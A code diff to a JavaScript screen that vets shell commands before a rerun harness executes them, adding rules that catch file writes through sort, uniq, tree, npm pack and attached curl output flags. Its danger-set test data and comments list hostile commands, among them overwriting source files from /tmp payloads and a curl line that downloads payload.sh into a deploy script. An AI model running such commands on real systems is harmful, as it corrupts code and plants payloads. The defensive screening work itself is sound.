@@ -17,14 +17,28 @@
 // WHY A SCREEN AT ALL. Wave 3's census wants to RE-EXECUTE historical commands
 // harvested from other agents' past runs — untrusted input by construction —
 // and `runRerun` gates on `classifySafety` (rerun.mjs:420) and then hands the
-// survivor to `spawnSync("/bin/sh", ["-c", cmd])` (rerun.mjs:337). Measured
-// against 31 synthetic outage-capable commands, `classifySafety` rated 26 of
-// them SAFE, including `reboot`, `shutdown -h now`, `MIX_ENV=test mix
-// ecto.drop`, `pkill -f barkpark`, `cp /tmp/evil.js api/lib/…/application.ex`,
-// `systemctl stop barkpark.service` and `bash /opt/barkpark/deploy/
-// site-deploy.sh`. Under a census, each false-safe is an EXECUTION, not a
-// warning — and three live cycles share this checkout while a fourth measures
-// against the deployed build.
+// survivor to `spawnSync("/bin/sh", ["-c", cmd])` (rerun.mjs:337). Under a
+// census, each false-safe is an EXECUTION, not a warning — and three live cycles
+// share this checkout while a fourth measures against the deployed build.
+//
+// THE SIZE OF THE GAP IS RE-DERIVED, NEVER REMEMBERED. An earlier version of
+// this comment carried a count of synthetic commands `classifySafety` rated
+// SAFE — a number nothing in the tree could reproduce, from a set that no longer
+// exists. It is RETIRED, and screen.test.mjs greps both files to keep it
+// retired. The replacement is a pair of measurements the suite recomputes on
+// every run, both asserted in screen.test.mjs ("the size of the gap is
+// RE-DERIVED…"):
+//
+//   • over DANGER_SET below — commands whose admission is an outage or a
+//     corrupted checkout — `classifySafety` admits ALL of them and this screen
+//     admits NONE (29/29 vs 0/29 at the time of writing; the test asserts the
+//     RATIO against the live set, not a frozen count, so growing DANGER_SET
+//     cannot make the claim stale);
+//   • over the frozen 651-command corpus, `classifySafety` admits 572 (87.9%)
+//     against this screen's 240 (36.9%).
+//
+// Both are re-derivable in one command: `node tooling/grip/screen.mjs --census`
+// for the second, `node --test tooling/grip/test/screen.test.mjs` for both.
 //
 // THREE LAYERS, IN THIS ORDER. The order is the design, not an implementation
 // detail:
@@ -312,14 +326,20 @@ const CURL_BODY_FLAGS = ["-d", "--data", "--data-raw", "--data-binary", "--data-
 // value-taking letter is only honoured as the LAST in its cluster (that is how
 // getopt works: `-so X` binds X to `o`, `-os X` does not bind at all). Long
 // `--flag=value` forms are normalised the same way.
-const CURL_VALUE_LETTERS = new Set(["o", "T", "d", "F", "X", "w", "H", "b", "c", "K", "E", "u", "A", "e", "D", "Y", "y", "m", "Z"]);
-const CURL_WRITE_LETTERS = new Map([
-  ["O", "-O writes a file named after the remote resource"],
-  ["J", "-J writes a file named by the server's Content-Disposition"],
-]);
+//
+// The normaliser is GENERIC — it takes the tool's value-taking letters — because
+// `curl` is not the only allowlisted head whose `-o` writes a file. Copying it
+// per tool is how five hand-copies of one grammar drift apart, which is this
+// epic's own named defect class.
 
-/** Expand `-so` into `["-s","-o"]`; split `--flag=v` into `["--flag","v"]`. */
-function normaliseCurlArgv(argv) {
+/**
+ * Expand `-so` into `["-s","-o"]`, `-o/tmp/x` into `["-o","/tmp/x"]`, and split
+ * `--flag=v` into `["--flag","v"]`.
+ *
+ * @param {string[]} argv
+ * @param {Set<string>} valueLetters short letters that take a value
+ */
+function normaliseArgv(argv, valueLetters) {
   const out = [];
   for (const t of argv) {
     if (/^--[^=]+=/.test(t)) {
@@ -330,15 +350,38 @@ function normaliseCurlArgv(argv) {
       letters.forEach((ch, i) => {
         // A value-taking letter mid-cluster consumes the REST of the cluster as
         // its value (`-oX` is `-o X`), so nothing after it is a flag.
-        if (CURL_VALUE_LETTERS.has(ch) && i < letters.length - 1) out.push(`-${ch}`, letters.slice(i + 1).join(""));
-        else if (i === 0 || !CURL_VALUE_LETTERS.has(letters[i - 1])) out.push(`-${ch}`);
+        if (valueLetters.has(ch) && i < letters.length - 1) out.push(`-${ch}`, letters.slice(i + 1).join(""));
+        else if (i === 0 || !valueLetters.has(letters[i - 1])) out.push(`-${ch}`);
       });
+    } else if (/^-[A-Za-z]+[^A-Za-z]/.test(t)) {
+      // A cluster with a NON-LETTER value attached: `-o/tmp/evil`, `-w%{code}`,
+      // `-k2,2`. The `{2,}`-letters branch above cannot see these — its pattern
+      // is letters-only — so `curl -so/tmp/evil https://x` was ADMITTED by both
+      // layers. Same defect as the clustered `-so /tmp/evil` spelling, one
+      // punctuation character further along.
+      const [, cluster, attached] = t.match(/^-([A-Za-z]+)([^A-Za-z].*)$/);
+      const letters = [...cluster];
+      const at = letters.findIndex((ch) => valueLetters.has(ch));
+      if (at < 0) {
+        out.push(t);
+      } else {
+        for (let i = 0; i < at; i++) out.push(`-${letters[i]}`);
+        out.push(`-${letters[at]}`, letters.slice(at + 1).join("") + attached);
+      }
     } else {
       out.push(t);
     }
   }
   return out;
 }
+
+const CURL_VALUE_LETTERS = new Set(["o", "T", "d", "F", "X", "w", "H", "b", "c", "K", "E", "u", "A", "e", "D", "Y", "y", "m", "Z"]);
+const CURL_WRITE_LETTERS = new Map([
+  ["O", "-O writes a file named after the remote resource"],
+  ["J", "-J writes a file named by the server's Content-Disposition"],
+]);
+
+const normaliseCurlArgv = (argv) => normaliseArgv(argv, CURL_VALUE_LETTERS);
 
 const curlRule = {
   check(rawArgv) {
@@ -499,6 +542,89 @@ const commandRule = {
   },
 };
 
+// ── THE TEXT TOOLS THAT WRITE ────────────────────────────────────────────────
+//
+// `sort`, `uniq` and `tree` were registered as bare `plainRule()` — filed under
+// "searching + shaping text (none of these can execute a string)", which is
+// true and is the WRONG QUESTION. None of them executes a string; all three
+// WRITE A FILE on request:
+//
+//   sort input.txt -o api/lib/barkpark/application.ex   # overwrites it
+//   uniq /tmp/in.txt api/lib/barkpark/application.ex    # POSIX: arg 2 is OUTPUT
+//   tree -o api/lib/barkpark/application.ex             # overwrites it
+//
+// That is BYTE-IDENTICAL in outcome to `cp /tmp/evil.js api/lib/barkpark/
+// application.ex` — D29's own named danger, which this module closes BY NAME in
+// both REFUSED_HEADS and WRITE_SHAPES. A denylist survived inside the module
+// whose thesis is that denylists cannot be complete, and the shipped suite could
+// not see it because DANGER_SET was written from the same head list that has the
+// gap. The fix is therefore not only these three rules but the four DANGER_SET
+// probes below them: a named set measures the shapes it contains and nothing
+// else.
+//
+// HONEST BOUNDS, both of them:
+//   • LATENT, not live. 0 of the 240 admitted corpus rows use any of these
+//     shapes. It matters because harvest.mjs regenerates the corpus from
+//     arbitrary other agents' transcripts, so today's fixture bounds nothing
+//     about tomorrow's input.
+//   • The `sort -o` and `uniq <in> <out>` writes were reproduced LIVE — a victim
+//     file went from "original content" to "PWNED" through each. `tree -o` was
+//     NOT: tree is not installed on this host, so that one rests on tree(1)
+//     ("-o filename: Send output to filename") and is refused on the documented
+//     flag rather than an observed overwrite. Refusing it costs nothing either
+//     way; the census admits no tree command at all.
+//
+// NEVER CRY WOLF: the guard targets the WRITE FLAG, never the tool. `sort
+// file.txt`, `sort -u -k2,2 file.txt`, `uniq -c file.txt` and `tree docs/` all
+// stay admitted, and NEVER_CRY_WOLF_SET carries them.
+
+const SORT_VALUE_LETTERS = new Set(["o", "k", "t", "S", "T"]);
+const TREE_VALUE_LETTERS = new Set(["o", "L", "P", "I", "H", "T"]);
+
+/** `-o FILE` / `--output FILE` on a tool whose output otherwise goes to stdout. */
+const outputFlagRule = (head, valueLetters) => ({
+  check(rawArgv) {
+    const argv = normaliseArgv(rawArgv, valueLetters);
+    for (let i = 1; i < argv.length; i++) {
+      const t = argv[i];
+      if (t === "-o" || t === "--output") {
+        const dest = arg(argv, i + 1);
+        return `${head} ${t} WRITES its output to a file (${dest ?? "missing target"}) — \`${head} ${t} <path>\` overwrites that path with different content, exactly like \`cp\`. Drop the flag and read ${head}'s output on stdout.`;
+      }
+    }
+    return null;
+  },
+});
+
+// uniq's SECOND POSITIONAL is an output file. POSIX: `uniq [input [output]]`.
+// It is not a second input, and there is no flag to notice — the write is
+// spelled as an ordinary-looking filename.
+const UNIQ_VALUE_FLAGS = new Set(["-f", "-s", "-w", "--skip-fields", "--skip-chars", "--check-chars"]);
+
+const uniqRule = {
+  check(argv) {
+    const positionals = [];
+    for (let i = 1; i < argv.length; i++) {
+      const t = argv[i];
+      if (t === "--") {
+        positionals.push(...argv.slice(i + 1));
+        break;
+      }
+      if (t.startsWith("-") && t.length > 1) {
+        // `-f 2` and `--skip-fields 2` take a SEPARATE value token; `-f2` and
+        // `--skip-fields=2` carry it attached and consume nothing.
+        if (UNIQ_VALUE_FLAGS.has(t)) i++;
+        continue;
+      }
+      positionals.push(t);
+    }
+    if (positionals.length >= 2) {
+      return `uniq's SECOND positional is an OUTPUT FILE, not a second input — \`uniq ${positionals[0]} ${positionals[1]}\` WRITES ${positionals[1]}, overwriting whatever is there. Pass one input and read the result on stdout.`;
+    }
+    return null;
+  },
+};
+
 const cdRule = {
   check(argv) {
     if (argv.length > 2) return "cd with more than one argument";
@@ -534,7 +660,7 @@ export const ALLOWED_HEADS = new Map([
   ["realpath", plainRule()],
   ["readlink", plainRule()],
   ["find", findRule],
-  ["tree", plainRule()],
+  ["tree", outputFlagRule("tree", TREE_VALUE_LETTERS)],
   // searching + shaping text (none of these can execute a string)
   ["grep", plainRule()],
   ["egrep", plainRule()],
@@ -542,8 +668,8 @@ export const ALLOWED_HEADS = new Map([
   ["rg", plainRule()],
   ["ag", plainRule()],
   ["ack", plainRule()],
-  ["sort", plainRule()],
-  ["uniq", plainRule()],
+  ["sort", outputFlagRule("sort", SORT_VALUE_LETTERS)],
+  ["uniq", uniqRule],
   ["cut", plainRule()],
   ["tr", plainRule()],
   ["nl", plainRule()],
@@ -588,7 +714,12 @@ export const ALLOWED_HEADS = new Map([
     },
   }],
   ["launchctl", verbRule(["list", "print"], "launchctl")],
-  ["npm", verbRule(["ls", "view", "info", "outdated", "why", "version", "config", "root", "bin", "pack"], "npm")],
+  // `pack` was on this list and is a WRITE: `npm pack` builds a tarball and
+  // drops `<name>-<version>.tgz` into the working directory. Found alongside the
+  // sort/uniq/tree hole, same root cause — a verb judged by "does it execute
+  // something?" rather than "does it write?". Removing it costs the census
+  // nothing: 0 of the 651 frozen corpus commands use it.
+  ["npm", verbRule(["ls", "view", "info", "outdated", "why", "version", "config", "root", "bin"], "npm")],
   ["pnpm", verbRule(["ls", "view", "info", "outdated", "why", "list", "root", "bin"], "pnpm")],
 ]);
 
@@ -707,8 +838,31 @@ export function screenSegment(segment) {
 // that module, and `cp /tmp/evil.js api/lib/barkpark/application.ex` is exactly
 // the command that overwrites a live source file with different content.
 
+// A backstop entry may be a REGEX or a PREDICATE over the scanned string. The
+// three text tools need a predicate: `uniq in.txt out.txt` is a write with no
+// flag in it at all — the write is spelled as an ordinary filename in the second
+// positional — and no honest regex separates that from `uniq -f 2 in.txt`.
+//
+// THE BACKSTOP SHARES THE LAYER-(b) PREDICATE ON PURPOSE, and that bounds what
+// it defends against. It catches the mistake this hole actually was: a head
+// re-registered as `plainRule()`, or dropped from ALLOWED_HEADS and re-added
+// carelessly. It does NOT independently re-derive the judgement, so a bug INSIDE
+// `outputFlagRule`/`uniqRule` fails both layers at once. Hand-copying the
+// grammar into a second regex would buy that one case and cost the drift this
+// epic exists to abolish (five hand-copies of one grammar is its named defect
+// class). The mutation proof in screen.test.mjs exercises exactly the case this
+// layer does cover.
+const headWritesFile = (head, rule) => (scanned) =>
+  String(scanned)
+    .split(/[|;&\n]+/)
+    .map((seg) => tokenize(seg.trim()))
+    .some((argv) => argv.length > 0 && argv[0].split("/").pop() === head && rule.check(argv) !== null);
+
 export const WRITE_SHAPES = [
   [/\bcp\s/, "cp (overwrites a file with different content — absent from rerun.mjs's WRITE_SHAPES)"],
+  [headWritesFile("sort", outputFlagRule("sort", SORT_VALUE_LETTERS)), "sort -o/--output writes a file"],
+  [headWritesFile("tree", outputFlagRule("tree", TREE_VALUE_LETTERS)), "tree -o/--output writes a file"],
+  [headWritesFile("uniq", uniqRule), "uniq's second positional is an output file"],
   [/\b(rm|mv|dd|trash|shred|truncate|install)\s/, "destructive filesystem verb"],
   [/\b(mkdir|touch|chmod|chown|chgrp|ln)\s/, "filesystem mutation"],
   [/\btee\b/, "tee"],
@@ -741,7 +895,9 @@ export const WRITE_SHAPES = [
  */
 export function writeShapeReason(scanned) {
   const s = String(scanned ?? "");
-  for (const [re, why] of WRITE_SHAPES) if (re.test(s)) return why;
+  for (const [matcher, why] of WRITE_SHAPES) {
+    if (typeof matcher === "function" ? matcher(s) : matcher.test(s)) return why;
+  }
   return null;
 }
 
@@ -857,6 +1013,25 @@ export const DANGER_SET = [
   "bp --server=https://example.com task ls",
   "journalctl --vacuum-size=1M",
   "date -s 2020-01-01",
+  // ── the arbitrary file-overwrite primitive, added in wave 4. Every one of
+  // these was ADMITTED by the shipped screen, and the first two are byte-
+  // identical in outcome to `cp /tmp/evil.js api/lib/barkpark/application.ex`
+  // six rows above — which this module closes BY NAME. The named set could not
+  // see them because it was written from the same head list that had the gap;
+  // they belong HERE, not only in the test file, so the shipped --selftest
+  // carries them.
+  "sort -o api/lib/barkpark/application.ex /tmp/payload.txt",
+  "sort input.txt -o api/lib/barkpark/application.ex",
+  "uniq /tmp/payload.txt api/lib/barkpark/application.ex",
+  "tree -o /opt/barkpark/deploy/site-deploy.sh",
+  // `npm pack` drops <name>-<version>.tgz into the working directory. Same root
+  // cause: a verb judged by "does it execute something?" not "does it write?".
+  "npm pack",
+  // The clustered `-o` with its value ATTACHED — `-so/tmp/x` rather than
+  // `-so /tmp/x`. Wave 2's review closed the spaced spelling and the letters-only
+  // cluster pattern could not see this one, so D29's named danger stayed open in
+  // a third spelling.
+  "curl -s https://example.com/payload.sh -so/opt/barkpark/deploy/site-deploy.sh",
 ];
 
 /** Must stay ADMITTED. Refusing these is the gate punishing honest work. */
@@ -873,6 +1048,14 @@ export const NEVER_CRY_WOLF_SET = [
   "curl -s -o /dev/null -w %{http_code} https://x/",
   "systemctl is-active barkpark.service",
   "docker ps",
+  // The write guards added in wave 4 target the FLAG, never the tool. If any of
+  // these ever refuses, the guard has started crying wolf on ordinary text work.
+  "sort /tmp/lines.txt",
+  "sort -u -k2,2 /tmp/lines.txt",
+  "uniq -c /tmp/lines.txt",
+  "uniq -f 2 /tmp/lines.txt",
+  "tree docs/",
+  "tree -L 2 -I node_modules docs/",
 ];
 
 /**
